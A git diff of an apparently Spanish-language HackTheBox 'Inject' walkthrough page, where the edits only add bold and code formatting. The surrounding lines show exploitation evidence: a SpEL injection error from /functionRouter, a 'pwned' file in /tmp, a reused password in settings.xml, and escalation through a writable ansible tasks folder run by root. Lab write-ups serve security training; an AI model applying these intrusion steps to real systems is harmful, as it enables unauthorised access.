@@ -317,7 +317,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>  &#34;message&#34;: &#34;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&#34;,
 </span></span><span style="display:flex;"><span>  &#34;path&#34;: &#34;/functionRouter&#34;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Listo el directorio tmp y veo que ha creado el archivo pwned.</p>
+</span></span></code></pre></div><p>Listo el directorio <code>/tmp</code> y veo que ha creado el archivo <strong>pwned</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ./script.py /tmp
 </span></span><span style="display:flex;"><span>.font-unix
 </span></span><span style="display:flex;"><span>.ICE-unix
@@ -368,7 +368,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </span></span><span style="display:flex;"><span>drwx------ 2 frank frank 4096 Feb  1 18:38 .
 </span></span><span style="display:flex;"><span>drwxr-xr-x 5 frank frank 4096 Feb  1 18:38 ..
 </span></span><span style="display:flex;"><span>-rw-r----- 1 root  frank  617 Jan 31 16:55 settings.xml
-</span></span></code></pre></div><p>En <code>settings.xml</code> encuentro la contraseña del usuario phil.</p>
+</span></span></code></pre></div><p>En <code>settings.xml</code> encuentro la contraseña del usuario <strong>phil</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;settings</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span style="color:#f92672">&gt;</span>
@@ -390,7 +390,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </span></span><span style="display:flex;"><span>phil@inject:~$
 </span></span></code></pre></div><p>lanzo <strong>pspy</strong> y veo que <strong>root</strong> ejecuta con <code>ansible-parallel</code> todos los archivos <code>.yml</code> en <code>/opt/automation/tasks/*</code>.</p>
 <pre tabindex="0"><code>UID=0 | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
-</code></pre><p>Phil tiene permisos de escritura en el directorio <code>/task</code> porque pertenece al grupo <strong>staff</strong>.</p>
+</code></pre><p><strong>Phil</strong> tiene permisos de escritura en el directorio <code>/task</code> porque pertenece al grupo <strong>staff</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>phil@inject:/opt/automation/tasks/$ id 
 </span></span><span style="display:flex;"><span>uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
 </span></span></code></pre></div><p>Creo el archivo <code>root.yml</code> y lo subo a la máquina víctima.</p>
